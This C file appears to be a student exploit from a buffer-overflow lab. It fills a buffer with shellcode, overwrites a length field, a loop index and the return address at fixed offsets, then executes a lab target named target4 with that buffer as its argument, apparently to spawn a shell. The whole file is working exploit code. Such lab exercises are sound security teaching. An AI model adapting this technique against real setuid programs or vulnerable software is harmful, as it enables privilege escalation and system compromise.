#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target4"
#define NEW_LEN 188
#define SHELL_LEN 45
#define BUF_LEN 189
#define NEW_RET 0x2021fdb0
#define NEW_I 172

int main(void)
{
 	char *args[3];
 	char *env[6];

	env[0] = NULL;

	char attack[BUF_LEN];
	
	int i;
	for (i = 0; i < BUF_LEN; i++) {
	    attack[i] = 0xff;
	}
	
	for (i = 0; i < SHELL_LEN; i++) {
	    attack[i] = shellcode[i];
	}
	    // I
	
	int* overwrite = (int*) (attack + 168);
	*overwrite = NEW_LEN;
	    
	    overwrite = (int*) (attack + 172);
	*overwrite = NEW_I;
	
	overwrite = (int*) (attack + 184);
	*overwrite = NEW_RET;
	
	attack[BUF_LEN-1] = '\0';

 	args[0] = TARGET;
	args[1] = attack;
	args[2] = NULL;

	env[0] = &attack[170];
	env[1] = &attack[171];
	env[2] = &attack[172];

	env[3] = &attack[174];
	env[4] = &attack[175];
	env[5] = &attack[176];
	if (0 > execve(TARGET, args, env))
    	fprintf(stderr, "execve failed.\n");

	return 0;
}
